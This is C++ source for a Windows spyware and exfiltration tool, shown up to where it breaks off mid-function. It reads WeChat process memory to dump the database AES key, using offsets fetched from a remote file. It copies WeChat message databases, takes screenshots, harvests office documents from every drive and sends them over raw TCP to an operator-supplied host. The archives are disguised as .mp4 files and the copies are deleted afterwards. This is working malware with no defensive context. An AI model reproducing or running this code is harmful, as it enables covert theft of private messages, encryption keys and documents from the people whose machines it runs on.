#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include "zip.h"
#include "unzip.h"
#include <Winhttp.h>
#include <thread>
#include  <direct.h>  
#include <shlobj.h> // Needed to use the SHGetFolderPath function.
#include <atlimage.h>
//注意这个头文件
#include <io.h>
#include <wchar.h>
#include <atlstr.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Winhttp.lib")
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib, "netapi32.lib")

#define GUID_LEN 64  
#define BUFSIZE 256
char * fname;
int counts = 0;
using namespace std;


void getFileNames(string path, vector<string>& files);


#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define  MAX_DATA_BLOCK_SIZE 409600


void send_file(const char* file_name, const char* ip, u_short port) {

	WSADATA wsaData;
	SOCKET s;
	FILE *fp;
	struct sockaddr_in server_addr;
	char data[MAX_DATA_BLOCK_SIZE];
	int i;
	int ret;
	fp = fopen(file_name, "rb");
	if (fp == NULL) {
		//printf("无法打开文件\n");
		return;
	}
	WSAStartup(0x202, &wsaData);
	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void *)&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(ip);
	server_addr.sin_port = htons(port);
	if (connect(s, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_in)) == SOCKET_ERROR) {
		//printf("连接服务器失败\n");
		fclose(fp);
		closesocket(s);
		WSACleanup();
		return;
	}

	//printf("发送文件名。。。\n");
	send(s, file_name, strlen(file_name), 0);
	send(s, "\0", 1, 0);

	while (true)
 {
		memset((void *)data, 0, sizeof(data));
		i = fread(data, 1, sizeof(data), fp);
		if (i == 0) {
			printf("\nClient Upload Sucessful!\n");
			break;
		}
		ret = send(s, data, i, 0);
		putchar('.');
		if (ret == SOCKET_ERROR) {
			printf("\nerror\n");
			break;
		}
	}
	fclose(fp);
	closesocket(s);
	WSACleanup();
}


typedef struct _URL_INFO
{
	WCHAR szScheme[512];
	WCHAR szHostName[512];
	WCHAR szUserName[512];
	WCHAR szPassword[512];
	WCHAR szUrlPath[512];
	WCHAR szExtraInfo[512];
}URL_INFO, *PURL_INFO;


std::wstring GetRightStr(const std::wstring& source, const wchar_t* subStr)
{
	int index = source.find(subStr);

	std::wstring rightPart;
	if (index >= 0)
	{
		rightPart = source.substr(index + wcslen(subStr));
	}
	return rightPart;
}


std::string  webhttp(const wchar_t *Url, DWORD*dwStatusCodeReturn = NULL)
{
	URL_INFO url_info = { 0 };
	URL_COMPONENTSW lpUrlComponents = { 0 };
	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
	lpUrlComponents.lpszHostName = url_info.szHostName;
	lpUrlComponents.lpszPassword = url_info.szPassword;
	lpUrlComponents.lpszScheme = url_info.szScheme;
	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
	lpUrlComponents.lpszUserName = url_info.szUserName;

	lpUrlComponents.dwExtraInfoLength =
		lpUrlComponents.dwHostNameLength =
		lpUrlComponents.dwPasswordLength =
		lpUrlComponents.dwSchemeLength =
		lpUrlComponents.dwUrlPathLength =
		lpUrlComponents.dwUserNameLength = 512;

	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &lpUrlComponents);

	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0);
	DWORD dwReadBytes = 0, dwSizeDW = sizeof(dwSizeDW), dwContentSize = 0, dwIndex = 0, dwStatusCode = 0;

	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);

	WCHAR fullUrlPath[5120] = { 0 };

	wcscpy_s(fullUrlPath, lpUrlComponents.lpszUrlPath);

	std::wstring rightPart = GetRightStr(Url, L"?");
	if (rightPart != L"")
	{
		wcscat_s(fullUrlPath, L"?");
		wcscat_s(fullUrlPath, rightPart.c_str());
	}

	//	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", fullUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	// 	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	// 	WinHttpReceiveResponse(hRequest, 0);
	// 	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);
	// 	WinHttpCloseHandle(hRequest);

	DWORD dwFlags = WINHTTP_FLAG_REFRESH;
	if (_T(Url, _T("https")))
		dwFlags |= WINHTTP_FLAG_SECURE;
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", fullUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);

	dwSizeDW = sizeof(dwContentSize);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);

	dwSizeDW = sizeof(dwStatusCode);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSizeDW, NULL);
	if (dwStatusCodeReturn)
		*dwStatusCodeReturn = dwStatusCode;
	BYTE *pBuffer = NULL;
	pBuffer = new BYTE[dwContentSize + 1];
	ZeroMemory(pBuffer, dwContentSize + 1);

	if (dwContentSize > 0)
	{
		do {
			WinHttpReadData(hRequest, pBuffer, dwContentSize, &dwReadBytes);
		} while (dwReadBytes == 0);
	}

	//std::cout << pBuffer << endl;
	// delete pBuffer;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	std::string resultStr((char*)pBuffer);

	if (pBuffer)
	{
		delete[]pBuffer;
	}

	return resultStr;


}


void Replace(std::string& str, const char* to_replaced, const char* newchars)
{
	int sourceLen = strlen(to_replaced);
	int targetLen = strlen(newchars);
	for (std::string::size_type pos(0); pos != std::string::npos; pos += targetLen)
	{
		pos = str.find(to_replaced, pos);
		if (pos != std::string::npos)
			str.replace(pos, sourceLen, newchars);
		else
			break;
	}
}

std::wstring Ansi2Unicode(const CHAR* orgStr)
{
	if (!orgStr)
		return NULL;

	int len = -1;
	int currentPageCode = CP_ACP;
	len = MultiByteToWideChar(CP_ACP, 0, orgStr, -1, NULL, 0);

	WCHAR * wszGBK = new WCHAR[len + 4];
	if (!wszGBK)
		return NULL;
	MultiByteToWideChar(CP_ACP, 0, orgStr, -1, wszGBK, len);

	std::wstring resultStr(wszGBK);
	delete[]wszGBK;
	return resultStr;
}

std::string Unicode2Ansi(const WCHAR* orgStr)
{
	if (!orgStr)
		return NULL;

	int len = -1;
	int currentPageCode = CP_ACP;
	len = ::WideCharToMultiByte(CP_ACP, 0, orgStr, -1, NULL, 0, NULL, NULL);

	CHAR * wszGBK = new CHAR[len + 4];
	if (!wszGBK)
		return NULL;
	::WideCharToMultiByte(CP_ACP, 0, orgStr, -1, wszGBK, len, NULL, NULL);

	std::string resultStr(wszGBK);
	delete[]wszGBK;
	return resultStr;
}


#include <tlhelp32.h>
#pragma comment(lib, "version.lib")
// #include <Psapi.h>	//EnumProcessModules
// #pragma comment(lib, "psapi.lib")
DWORD GetProcessID(LPCTSTR pName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
		return NULL;
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk;
	for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe))
	{
		if (!_tcsicmp(pe.szExeFile, pName))
		{
			CloseHandle(hSnapshot);
			return pe.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return NULL;
}

CString GetFileVersionInfo(LPCTSTR exePath)
{
	CString fileDescription;
	CString productVersion;
	DWORD dwHandle = 0;
	DWORD dwInfoSize = GetFileVersionInfoSize(exePath, &dwHandle);

	if (dwInfoSize <= 0)
		return _T("");

	void *pvInfo = malloc(dwInfoSize);
	if (!pvInfo)
		return _T("");

	if (::GetFileVersionInfo(exePath, 0, dwInfoSize, pvInfo))
	{
		struct LANGANDCODEPAGE {
			WORD wLanguage;
			WORD wCodePage;
		} *lpTranslate;

		UINT cbTranslate = 0;
		if (VerQueryValue(pvInfo, _T("\\VarFileInfo\\Translation"), (void**)&lpTranslate, &cbTranslate)) {
			// ONLY Read the file description for FIRST language and code page.
			if ((cbTranslate / sizeof(struct LANGANDCODEPAGE)) > 0) {
				const TCHAR *lpBuffer = 0;
				UINT  cbSizeBuf = 0;
				TCHAR  szSubBlock[50] = { 0 };

				// Retrieve file description for language and code page 0

#if (_MSC_VER<=1200)
				_stprintf(szSubBlock, _T("\\StringFileInfo\\%04x%04x//FileDescription"), lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
#else
				_stprintf_s(szSubBlock, _T("\\StringFileInfo\\%04x%04x//FileDescription"), lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
#endif
				if (VerQueryValue(pvInfo, szSubBlock, (void**)&lpBuffer, &cbSizeBuf)) {
					fileDescription = lpBuffer;
				}

				// Retrieve file version for language and code page 0
#if (_MSC_VER<=1200)
				_stprintf(szSubBlock, _T("\\StringFileInfo\\%04x%04x\\FileVersion"), lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
#else
				_stprintf_s(szSubBlock, _T("\\StringFileInfo\\%04x%04x\\FileVersion"), lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
#endif
				if (VerQueryValue(pvInfo, szSubBlock, (void**)&lpBuffer, &cbSizeBuf)) {
					//warning4996: strncpy(lpoutProductVersion, lpBuffer, cbVerSize-1);
					productVersion = lpBuffer;
				}
				// Retrieve others for language and code page 0 if you like
				// ...
			}
		}
	}

	free(pvInfo);

	return productVersion;
}

BYTE* GetBaseAddr(BYTE* wdBaseAddr, LPCTSTR version)
{
	std::string resultStr = webhttp((L"https://jihulab.com/bluesky1/padding/-/raw/main/README.md"));
	if (resultStr == "")
	{
		std::cout << "info download error" << std::endl;
		return NULL;
	}

	std::string versionStr = Unicode2Ansi(CA2W(version));
	Replace(resultStr, " ", "");
	Replace(resultStr, "\t", "");

	int offsetAddr = 0;
	char targetVersion[256] = { 0 };
	sprintf_s(targetVersion, "\"%s\"", versionStr.c_str());
	const char* ptr = strstr(resultStr.c_str(), targetVersion);
	if (!ptr)
	{
		std::cout << "[-] This Version Not Support1." << std::endl;
		return NULL;
	}
	ptr = strstr(ptr, "\"addr\":\"");
	if (!ptr)
	{
		std::cout << "[-] This Version Not Support2." << std::endl;
		return NULL;
	}

	ptr += strlen("\"addr\":\"");

	sscanf_s(ptr, "%x", &offsetAddr);

	//std::cout << std::hex << offsetAddr << std::endl;

	return wdBaseAddr + offsetAddr;
}

#include <fstream>
void DumpKey(int pid, MODULEENTRY32 ModEntry, LPCTSTR version, BYTE* wdBaseAddr)
{
	BYTE* keyBase = GetBaseAddr(wdBaseAddr, version);
	unsigned char wxname[100] = { 0 };


	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	SIZE_T readLen = 0;
	DWORD Pointer = 0;
	if (!::ReadProcessMemory(hProcess, keyBase, &Pointer, sizeof(Pointer), &readLen))
	{
		std::cout << "[-] Error code1:" << ::GetLastError() << std::endl;
		return;
	}
	byte keyBuf[32] = { 0 };
	if (!::ReadProcessMemory(hProcess, (LPCVOID)Pointer, keyBuf, sizeof(keyBuf), &readLen))
	{
		std::cout << "[-] Error code2:" << ::GetLastError() << std::endl;
		return;
	}
	//DWORD wxAddr = (DWORD)wdBaseAddr + 37895736;
	//printf("wxAddr = %x\n", wxAddr);
	//ReadProcessMemory(hProcess, (LPCVOID)wxAddr, wxname, 100, NULL);
	//printf("%s\n", wxname);
	std::string printStr, outputStr;
	for (int ki = 0; ki < sizeof(keyBuf); ki++)
	{
		char buf[256] = { 0 };
		sprintf_s(buf, "%02X", keyBuf[ki]);
		printStr += buf;

		if (ki > 0)
			sprintf_s(buf, ",0x%02X", keyBuf[ki]);
		else
			sprintf_s(buf, "0x%02X", keyBuf[ki]);
		outputStr += buf;
	}
	std::cout << "[+] Dump AES Key Success:" << printStr << std::endl;

	std::ofstream outFile;//实例化ofstream类，创建outFile对象，outFile是对象名字，可以随便取，以后的操作就是对outFile对象进行的
	outFile.open("DBPass.Bin");//调用outFile对象中的open函数，作用是将outFile对象与文件进行关联，参数是文件名，如果filename.txt不存在，则自动创建一个叫filename.txt的文件并与其关联。注：open()函数的参数可以是字符串也可是字符数组（如：char name[];outFile.open(name)）
	//警告：如果打开一个已存在的文件，这个文件里现存的所有内容都会丢失！！！
	outFile << outputStr;//向文件进行写入，因为cout其实也是ofstream类的一个对象，所以凡是能用于cout的也一样可以用于outFile，两者用法类似
	outFile.close();
}

void OpenWechatProc(DWORD processID)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processID);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return;

	MODULEENTRY32 me = { sizeof(me) };
	CString result;
	for (BOOL bOk = Module32First(hSnapshot, &me); bOk; bOk = Module32Next(hSnapshot, &me))
	{
		if (!_tcsicmp(me.szModule, _T("WeChatWin.dll")))
		{
			CString dllVersion = GetFileVersionInfo(me.szExePath);
			std::cout << "[*] WeChatWin Version:" << dllVersion << std::endl;
			DumpKey(processID, me, dllVersion, me.modBaseAddr);
			break;
		}
	}
	::CloseHandle(hSnapshot);
}






void getPath(char *dbpath)
{
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);

	ret = RegQueryValueEx(hKey, "Personal", 0, &dwType, (LPBYTE)dbpath, &length);
	strcat(dbpath, "\\WeChat Files");
	cout << "Please send back after human judgment!!!\n" << dbpath << endl;

	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
	}
}



BOOL PaintMouse(HDC hdc)
{
	HDC bufdc = NULL;
	CURSORINFO cursorInfo = { 0 };
	ICONINFO iconInfo = { 0 };
	HBITMAP bmpOldMask = NULL;

	bufdc = CreateCompatibleDC(hdc);
	RtlZeroMemory(&iconInfo, sizeof(cursorInfo));
	cursorInfo.cbSize = sizeof(cursorInfo);

	GetCursorInfo(&cursorInfo);

	GetIconInfo(cursorInfo.hCursor, &iconInfo);

	bmpOldMask = (HBITMAP)SelectObject(bufdc, iconInfo.hbmMask);
	BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20, bufdc, 0, 0, SRCAND);
	SelectObject(bufdc, iconInfo.hbmColor);
	BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20, bufdc, 0, 0, SRCPAINT);

	SelectObject(bufdc, bmpOldMask);
	DeleteObject(iconInfo.hbmColor);
	DeleteObject(iconInfo.hbmMask);
	DeleteDC(bufdc);
	return TRUE;
}

BOOL SaveBmp(HBITMAP hBmp, LPCTSTR imageName)
{
	//LPCTSTR imageName = "weixin.png";
	ATL::CImage image;
	image.Attach(hBmp);
	image.Save(imageName);
	return TRUE;
}



char *randstr(char *str, const int len)
{
	srand(time(NULL));
	int i;
	for (i = 0; i < len; ++i)
	{
		switch ((rand() % 3))
		{
		case 1:
			str[i] = 'A' + rand() % 26;
			break;
		case 2:
			str[i] = 'a' + rand() % 26;
			break;
		default:
			str[i] = '0' + rand() % 10;
			break;
		}
	}
	str[i] = '\0';
	return str;
}



BOOL ScreenCapture(LPCTSTR imageName)
{
	HWND hDesktopWnd = GetDesktopWindow();
	HDC hdc = GetDC(hDesktopWnd);
	HDC mdc = CreateCompatibleDC(hdc);
	DWORD dwScreenWidth = GetSystemMetrics(SM_CXSCREEN);
	DWORD dwScreenHeight = GetSystemMetrics(SM_CYSCREEN);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, dwScreenWidth, dwScreenHeight);
	HBITMAP holdbmp = (HBITMAP)SelectObject(mdc, bmp);
	BitBlt(mdc, 0, 0, dwScreenWidth, dwScreenHeight, hdc, 0, 0, SRCCOPY);
	PaintMouse(mdc);
	SaveBmp(bmp, imageName);
	DeleteDC(hdc);
	DeleteDC(mdc);
	return TRUE;


}



static ZRESULT DirToZip(HZIP& hz, LPCTSTR lpszSrcPath, int nBasePos)
{
	DWORD zResult = ZR_OK;

	WIN32_FIND_DATA fileData;
	TCHAR szFile[MAX_PATH] = { 0 };
	int nStart = _tcslen(lpszSrcPath);
	_tcscpy(szFile, lpszSrcPath);
	if (nStart&&_T('\\') != lpszSrcPath[nStart - 1]) {
		if (nBasePos == nStart) nBasePos++;
		szFile[nStart++] = _T('\\');
	}
	_tcscpy(szFile + nStart, _T("*"));
	HANDLE file = FindFirstFile(szFile, &fileData);
	while (FindNextFile(file, &fileData))
	{
		if (fileData.cFileName[0] == _T('.'))
			continue;
		_tcscpy(szFile + nStart, fileData.cFileName);
		// 如果是一个文件目录
		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			ZipAddFolder(hz, szFile + nBasePos);
			// 存在子文件夹 递归调用
			DirToZip(hz, szFile, nBasePos);
		}
		else
		{
			zResult = ZipAdd(hz, szFile + nBasePos, szFile);
			// if (zResult != ZR_OK) return zResult;
		}
	}
	return zResult;
}



void OneFile(char* pfilename, char* pfilter)
{
	WIN32_FIND_DATA findfiledate;
	HANDLE hfind;
	char filename[512];
	char lpFileName[512];
	char _lpFileName[512];
	int i;
	for (i = 0; *(pfilename + i) != '\0'; i++)
		filename[i] = *(pfilename + i);
	filename[i] = '\0';
	//如果最后一字符不是'\'
	if (filename[strlen(filename) - 1] != '\\')
		strcat(filename, "\\"); //添加'\'
	strcpy(lpFileName, filename);
	strcat(lpFileName, pfilter);
	hfind = FindFirstFile(lpFileName, &findfiledate);
	if (hfind == INVALID_HANDLE_VALUE)
		return;
	do
	{
		if (!(findfiledate.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
		{
			//如果找到指定文件
			//if (strstr(findfiledate.cFileName, fname))
			//printf("%s", fname);
			if (strstr(findfiledate.cFileName, fname))
			{

				printf("%s%s\n", filename, findfiledate.cFileName);
				counts++;
			}
		}
		else
		{
			if (findfiledate.cFileName[0] != '.')
			{
				strcpy(_lpFileName, filename);
				strcat(_lpFileName, (const char*)findfiledate.cFileName);
				OneFile(_lpFileName, pfilter);
			}
		}
	} while (FindNextFile(hfind, &findfiledate));
	FindClose(hfind);

}

void FindFile(char* pfilename, char* pfilter, char* fname, char* tempdir)
{

	WIN32_FIND_DATA findfiledate;
	HANDLE hfind;
	char filename[1000];
	char lpFileName[1000];
	char _lpFileName[1000];


	char source[1000];
	char target[1000];

	int i;
	for (i = 0; *(pfilename + i) != '\0'; i++)
		filename[i] = *(pfilename + i);
	filename[i] = '\0';
	//如果最后一字符不是'\'
	if (filename[strlen(filename) - 1] != '\\')
		strcat(filename, "\\"); //添加'\'
	strcpy(lpFileName, filename);
	strcat(lpFileName, pfilter);
	hfind = FindFirstFile(lpFileName, &findfiledate);
	string res;
	if (hfind == INVALID_HANDLE_VALUE)
		return;
	do
	{
		if (!(findfiledate.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
		{
			//如果找到指定文件

			//	if (strcmp(findfiledate.cFileName, fname) == 0)

			if (strstr(findfiledate.cFileName, fname))
			{	
				//printf("%s%s\n", findfiledate.cFileName, fname);
				res = findfiledate.cFileName;
				res = res.substr(res.find_last_of('.') + 1);//获取文件后缀
				if (res.data() == fname)
					printf("%s\n", res.c_str());
					lstrcpy(source, filename);
					lstrcpy(target, tempdir);
					lstrcat(source, "\\*.*");
					lstrcat(target, "\\");


					memset(source, '0', sizeof(source));
					lstrcpy(source, filename);
					lstrcat(source, "\\");
					lstrcat(source, findfiledate.cFileName);
					lstrcat(target, findfiledate.cFileName);
					CopyFile(source, target, TRUE);//直接调用文件复制函数
				// count++;
				}
			}
			else
			{
				if (findfiledate.cFileName[0] != '.')
				{
					strcpy(_lpFileName, filename);
					strcat(_lpFileName, (const char*)findfiledate.cFileName);
					FindFile(_lpFileName, pfilter, fname, tempdir);
				}
			}
		} while (FindNextFile(hfind, &findfiledate));
		FindClose(hfind);

}








int main(int argc, char* argv[])
{

	string passwd = argv[argc - 1];
	//printf(passwd.c_str());
	
	//if (strcmp(passwd.c_str(), "x") != 0) {
	///	exit(0);
	//}


	if (argc < 2) {
		return -1;
	}



	if (strcmp(argv[1], "-h") == 0) {
		printf("[+] %s dumpkey \n", argv[0]);
		printf("[+] %s photo 127.0.0.1 8888  \n", argv[0]);
		printf("[+] %s search d:\\ .docx \n", argv[0]);
		printf("[+] %s send 127.0.0.1 8888 \n", argv[0]);
		printf("[+] %s send 127.0.0.1 8888 vxpath\n", argv[0]);
		printf("[+] %s upload path 127.0.0.1 8888 \n", argv[0]);
		printf("[+] %s uploads path 127.0.0.1 8888 \n", argv[0]);
		printf("[+] %s all 127.0.0.1 8888 \n", argv[0]);
		printf("[+] %s user 127.0.0.1 8888 \n", argv[0]);
		return -1;
	}

	const char* filetype[] = { ".doc",".xls", ".pdf" ,".docx",".xlsx",".txt",".bat",".ppt",".pptx" };
	//const char* filetype[] = { ".bat" };
	int length = size(filetype); // 
	char value[256] = { 0 };
	vector<string> fileNames;

	static TCHAR tempzip[MAX_PATH];


	WORD wVersionRequested = MAKEWORD(2, 0); // 套接字版本
	WSADATA data;
	int nRes = ::WSAStartup(wVersionRequested, &data);


	char HostName[128];
	gethostname(HostName, sizeof(HostName));// 获得本机主机名.
	hostent* hn;
	hn = gethostbyname(HostName);//根据本机主机名得到本机ip
	char *chIP = inet_ntoa(*(struct in_addr *)hn->h_addr_list[0]);//把ip换成字符串形式
	::WSACleanup();


	if (strcmp(argv[1], "search") == 0)
	{

		char szLogicalDriveStrings[BUFSIZE];
		DWORD iLength;
		int iSub;


		iLength = GetLogicalDriveStringsA(BUFSIZE - 1, szLogicalDriveStrings);


		for (iSub = 0; iSub < iLength; iSub += 4)
		{
		//	if (GetDriveType((LPCSTR)szLogicalDriveStrings + iSub) != 3)
		//		continue;
			printf(szLogicalDriveStrings + iSub);
		}
		printf("\n");

		const char *str7 = argv[2];
		fname = argv[3];
		OneFile((char *)str7, (char *)"*.*");

		return 0;

	}


	if (strcmp(argv[1], "dumpkey") == 0) {

		getPath(value);             //获取数据库位置
		WSADATA wsaData;
		int err = WSAStartup(MAKEWORD(2, 0), &wsaData);
		if (err != 0)
		{
			std::cout << "web error" << std::endl;
			return err;
		}

		DWORD procId = GetProcessID(_T("WeChat.exe"));
		if (procId <= 0)
		{
			std::cout << "Wechat Process not found" << std::endl;
			return 0;
		}
		std::cout << "[*] Found Wechat Process Pid:" << procId << std::endl;
		OpenWechatProc(procId);//请注意：本次更新过webhttp函数
		std::cout << "[*] Save DBPass.Bin" << std::endl;
		std::cout << "[*] Done." << std::endl;




	}

	if (strcmp(argv[1], "upload") == 0)

	{
		char name[20];
		//char *file = randstr(name, 7);
		WORD wVersionRequested = MAKEWORD(2, 0);
		WSADATA data;


		char strBuffer[256] = { 0 };
		strcat_s(HostName, "_");
		char fn[30], *p;

		strcpy(fn, (p = strrchr(argv[2], '\\')) ? p + 1 : argv[3]); //获取文件名
		//printf("%s\n", fn);
		strcat_s(HostName, fn);
		//strcat_s(HostName, argv[2]);
		strcat_s(HostName, ".mp4");
		printf("%s...\n", HostName);
		DWORD zResult = ZR_OK;
		HZIP hz = CreateZip(HostName, 0);

		zResult = ZipAdd(hz, fn, argv[2]);
		CloseZip(hz);

		if (argv[4]) {
			send_file(HostName, argv[3], (u_short)atoi(argv[4]));

		}


		if (remove(HostName) == 0)
		{
			cout << "remove SucessFul" << endl;
		}



	}

	if (strcmp(argv[1], "all") == 0) {
		static TCHAR tempzip[MAX_PATH];
		char szLogicalDriveStrings[BUFSIZE];
		DWORD iLength;
		int iSub;

		char strTmpPath[MAX_PATH];
		static TCHAR tempdir[MAX_PATH];

		// 创建临时文件夹

		// char   tempdir[MAX_PATH];
		_getcwd(tempdir, MAX_PATH);
		lstrcat(tempdir, "\\wpsoffice");
		_mkdir(tempdir);


		char strBuffer[256] = { 0 };
		//DWORD dwSize = 256;
		//GetUserName(strBuffer, &dwSize);
		strcat_s(HostName, "_");
		strcat_s(HostName, chIP);
		strcat_s(HostName, "_file");
		strcat_s(HostName, ".mp4");


		ZeroMemory(szLogicalDriveStrings, BUFSIZE);
		iLength = GetLogicalDriveStringsA(BUFSIZE - 1, szLogicalDriveStrings);
		for (iSub = 0; iSub < iLength; iSub += 4)
		{
			for (int i = 0; i < length; i++)
			{
				if (strcmp(szLogicalDriveStrings + iSub, "C:\\") == 0) {
					break;
				}
				else
				{
					//printf("%s", szLogicalDriveStrings + iSub);
					FindFile((char *)szLogicalDriveStrings + iSub, (char *)"*.*", (char *)filetype[i], tempdir);
				}
			}

		}


		strcat_s(tempzip, HostName);
		strcat_s(tempzip, "_work_file");
		strcat_s(tempzip, ".mp4");
		printf(tempzip);
		DWORD zResult = ZR_OK;
		HZIP hz = CreateZip(tempzip, 0);
		LPCTSTR lpszSrcPath = tempdir;
		zResult = DirToZip(hz, lpszSrcPath, _tcsclen(lpszSrcPath));
		CloseZip(hz);
		if (argv[3]) {
			send_file(tempzip, argv[2], (u_short)atoi(argv[3]));

		}
		if (remove(tempzip) == 0)
		{
			cout << "remove SucessFul" << endl;
		}
		string ml = "";
		ml = "rmdir /s/q \"";
		ml += tempdir;
		system(ml.c_str());



	}

	if (strcmp(argv[1], "photo") == 0) 
	{
		char name[20];
		static TCHAR yXFHRONr[MAX_PATH];
		std::string logoStr = "_____________________\r\n"
		"\\______   \\__    ___/___ _____    _____\r\n"
			"|    |  _/ |    |_/ __ \\\\__  \\  /     \\\r\n"
			"|       \\ |    |\\  ___/ / __ \\|  Y Y  \\\r\n"
			"|____|   / |____| \\___  >____  /__|_|  /\r\n"
			"\\/             \\/     \\/      \\/\r\n";


		std::cout << logoStr << std::endl;
		char *exe = randstr(name, 7);
		strcat_s(yXFHRONr, exe);
		strcat_s(yXFHRONr, TEXT("_WeiXin.png"));
		LPCTSTR imageName = (LPCTSTR)yXFHRONr;
		ScreenCapture(imageName);

		printf("Open Current Path %s........\n", imageName);
		printf("Start Send........\n");

		if (argv[3]) {
			send_file(imageName, argv[2], (u_short)atoi(argv[3]));

		}


		if (remove(imageName) == 0)
		{
			cout << "remove SucessFul" << endl;
		}


	}


	if (strcmp(argv[1], "uploads") == 0)
	{
		if (argv[2]) {

			fileNames.push_back(argv[2]);

			
			string vx_image = fileNames.front();
			printf(vx_image.c_str());


			strcat_s(tempzip, HostName);
			strcat_s(tempzip, "_upload_file.zip");
			DWORD zResult = ZR_OK;
			HZIP hz = CreateZip(tempzip, 0);
			LPCTSTR lpszSrcPath = (LPCTSTR)vx_image.c_str();
			zResult = DirToZip(hz, lpszSrcPath, _tcsclen(lpszSrcPath));
			CloseZip(hz);
			send_file(tempzip, argv[3], (u_short)atoi(argv[4]));
			if (remove(tempzip) == 0)
			{
				cout << "remove SucessFul" << endl;
			}
		}


	}





	if (strcmp(argv[1], "send") == 0) {


		char source[1000];
		char target[1000];
		char target1[1000];
		char target2[1000];

		char   tempdir[MAX_PATH];
		_getcwd(tempdir, MAX_PATH);
		lstrcat(tempdir, "\\result");
		_mkdir(tempdir);


		if (argv[4]) {

			fileNames.push_back(argv[4]);
		}
		else
		{
			getPath(value);             //获取数据库位置

			getFileNames(value, fileNames);
		}




		strcat_s(HostName, "_vxdb_");
		strcat_s(HostName, chIP);
		strcat_s(HostName, ".mp4");
		
		const char* filetypex[] = { "MSG0.db","MSG1.db" ,"MSG2.db", }; //"\\Msg\\MicroMsg.db"
		char fn[30], *p;

		
		printf("Wechat Plugin:%s\n", fileNames.front().c_str());
		string vxdb = fileNames.front() +"\\Msg\\Multi\\";
		string MicroMsg = fileNames.front() + "\\Msg\\MicroMsg.db";
		for (int i = 0; i < 3; i++)
		{

			string wxdb = vxdb + (char *)filetypex[i];

			lstrcpy(target, tempdir);
			lstrcat(target, "\\");



			lstrcat(target, (char *)filetypex[i]);
			if  (_access(wxdb.c_str(), 0) == 0)
			{
				printf("%s\n", target);
			}
			
			CopyFile((LPCSTR)wxdb.c_str(), target, TRUE);

			//zResult = ZipAdd(hz, filetype[i], wxdb.c_str());
			//CloseZip(hz);
			//cout << target << endl;
		}
		lstrcpy(target1, tempdir);
		lstrcat(target1, "\\MicroMsg.db");
		printf("%s\n", target1);
		CopyFile((LPCSTR)MicroMsg.c_str(), target1, TRUE);
		//zResult = ZipAdd(hz, "DBPass.Bin", "DBPass.Bin");
		strcat_s(tempzip, HostName);
		char buffer[MAX_PATH];
		_getcwd(buffer, MAX_PATH);
		lstrcat(buffer, "\\DBPass.Bin");
		lstrcpy(target2, tempdir);
		lstrcat(target2, "\\DBPass.Bin");
